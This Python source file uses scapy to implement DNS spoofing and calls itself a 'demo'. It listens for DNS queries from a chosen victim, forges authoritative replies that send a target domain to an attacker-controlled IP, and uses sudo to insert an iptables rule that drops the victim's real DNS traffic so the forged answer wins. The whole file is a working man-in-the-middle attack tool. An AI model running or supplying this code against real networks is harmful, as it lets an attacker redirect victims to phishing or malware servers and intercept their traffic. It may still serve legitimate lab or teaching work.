import atexit
import os
import subprocess
from typing import Optional

from scapy.all import (
    DNS,
    DNSQR,
    DNSRR,
    IP,
    UDP,
    conf,
    get_if_addr,
    send,
    sniff,
)

_dns_drop_ip: Optional[str] = None


# Choose iface based on provided_iface/SCAPY_IFACE/route to target_ip for sniff/send.
def _select_iface(target_ip: Optional[str], provided_iface: Optional[str]) -> str:
    """
    Choose an interface: explicit CLI > SCAPY_IFACE env > routing decision.
    """
    # Scapy uses conf.iface as the default interface for send/sniff if not overridden.
    if provided_iface:
        return provided_iface
    env_iface = os.environ.get("SCAPY_IFACE")
    if env_iface:
        return env_iface
    if target_ip:
        # Use routing table to infer the best interface toward the victim.
        route_iface = conf.route.route(target_ip)[0]
        if route_iface:
            return route_iface
    return conf.iface


# Inspect DNS query packet and send a spoofed response for target_domain to spoof_ip.
def _on_dns_request(packet, target_domain: str, spoof_ip: str, victim_ip: Optional[str]):
    # Guard against unrelated UDP traffic.
    if not (packet.haslayer(IP) and packet.haslayer(DNSQR)):
        return
    if packet[DNS].qr != 0:
        return
    if victim_ip and packet[IP].src != victim_ip:
        return

    # DNSQR.qname is the queried name (bytes), DNS.qr==0 indicates a query.
    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".").lower()
    if target_domain not in qname:
        return

    print(f"[DNS] Query for {qname} from {packet[IP].src} -> spoofing to {spoof_ip}")
    # Build a minimal authoritative-looking response with a short TTL.
    response = (
        IP(dst=packet[IP].src, src=packet[IP].dst)
        # Swap UDP ports: reply from 53 to the original source port.
        / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
        / DNS(
            id=packet[DNS].id,
            qr=1,
            aa=1,
            qd=packet[DNS].qd,
            # DNSRR rrname matches the question; rdata is the spoofed IP.
            an=DNSRR(rrname=packet[DNSQR].qname, ttl=30, rdata=spoof_ip),
        )
    )
    # send() injects L3 packets through the OS stack (not raw L2 frames).
    send(response, verbose=False)


# Insert an iptables FORWARD drop for UDP/53 from ip_victim to win the spoof race.
def add_iptables_dns_drop(ip_victim: str) -> None:
    """
    Drop the victim's DNS queries so the real server never replies faster than we do.
    """
    global _dns_drop_ip
    _dns_drop_ip = ip_victim
    # Insert at the top to ensure the drop applies before other rules.
    subprocess.run(
        ["sudo", "iptables", "-I", "FORWARD", "-s", ip_victim, "-p", "udp", "--dport", "53", "-j", "DROP"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


# Remove the iptables rule added for ip_victim (best-effort cleanup).
def remove_iptables_dns_drop(ip_victim: Optional[str]) -> None:
    if not ip_victim:
        return
    # Best-effort cleanup; ignore failures.
    subprocess.run(
        ["sudo", "iptables", "-D", "FORWARD", "-s", ip_victim, "-p", "udp", "--dport", "53", "-j", "DROP"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


# Run DNS spoofing: sniff queries on iface and respond with spoof_ip for target_domain.
def run(
    target_domain: str,
    spoof_ip: Optional[str] = None,
    victim_ip: Optional[str] = None,
    iface: Optional[str] = None,
) -> None:
    """
    DNS spoofing demo: respond to queries for target_domain with spoof_ip.
    """
    normalized_domain = target_domain.rstrip(".").lower()
    chosen_iface = _select_iface(victim_ip, iface)
    # Set Scapy's default interface for sniff/send during the demo.
    conf.iface = chosen_iface

    # get_if_addr returns the IPv4 address assigned to the interface.
    resolved_spoof_ip = spoof_ip or get_if_addr(chosen_iface)
    if not resolved_spoof_ip:
        print("[!] Could not determine an IP address to spoof with. Aborting DNS demo.")
        return

    print("[*] DNS DEMO (Target-based Spoofing)")
    print(f"[i] Listening on interface: {chosen_iface}")
    print(f"[i] Spoofing domain: {normalized_domain} -> {resolved_spoof_ip}")
    if victim_ip:
        print(f"[i] Limiting spoofing to queries from {victim_ip}")
        add_iptables_dns_drop(victim_ip)
    else:
        print("[!] No victim IP provided; cannot firewall legitimate DNS replies.")

    bpf_filter = "udp port 53"
    if victim_ip:
        bpf_filter += f" and src host {victim_ip}"

    try:
        # Sniff DNS queries and craft spoofed responses in-line.
        sniff(
            # BPF filter keeps packet processing cheap by filtering in kernel.
            filter=bpf_filter,
            prn=lambda packet: _on_dns_request(packet, normalized_domain, resolved_spoof_ip, victim_ip),
            iface=chosen_iface,
        )
    finally:
        remove_iptables_dns_drop(victim_ip)


atexit.register(lambda: remove_iptables_dns_drop(_dns_drop_ip))
